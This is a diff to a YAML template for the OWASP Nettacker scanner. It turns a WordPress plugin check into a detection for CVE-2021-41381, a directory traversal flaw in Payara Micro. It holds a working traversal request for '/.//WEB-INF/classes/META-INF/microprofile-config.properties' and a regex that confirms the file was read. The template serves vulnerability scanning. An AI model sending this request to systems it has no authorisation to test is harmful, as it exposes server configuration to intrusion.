@@ -1,16 +1,20 @@
 info:
-  name: wordpress_version_scan
+  name: payara_webtemp_cve_2021_41381_vuln
   author: OWASP Nettacker Team
-  severity: 3
-  description: Directory, Backup finder
-  reference:
+  severity: 5
+  description: Payara Micro Community 5.2021.6 and below allows Directory Traversal
+  reference: 
+    - https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-054.txt
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-41381
   profiles:
-    - scan
+    - vuln
+    - vulnerability
     - http
-    - backup
-    - low_severity
-    - wp
-    - wordpress
+    - medium_severity
+    - cve2021
+    - cve
+    - payara
+    - lfi
 
 payloads:
   - library: http
@@ -20,13 +24,15 @@ payloads:
     stream: false
     proxies: ""
     steps:
+      
+        
       - method: get
         headers:
           User-Agent: "{user_agent}"
         allow_redirects: false
         url:
           nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/wp-content/plugins/{{paths}}/readme.txt"
+            input_format: "{{schema}}://{target}:{{ports}}/.//WEB-INF/classes/META-INF/microprofile-config.properties"
             prefix: ""
             suffix: ""
             interceptors:
@@ -37,15 +43,10 @@ payloads:
               ports:
                 - 80
                 - 443
-              #We are using small txt file. Work need to be done for handling user input based format files
-              paths: fuzzer_function_read_file_as_array('wordlists/wp_plugin_small.txt')
-              
+        
         response:
           condition_type: and
           conditions:
             content:
-              regex: "Tags:"
-              reverse: false
-            status_code:
-              regex: "200"
+              regex: payara.security.openid.default.providerURI=&payara.security.openid.sessionScopedConfiguration=true
               reverse: false
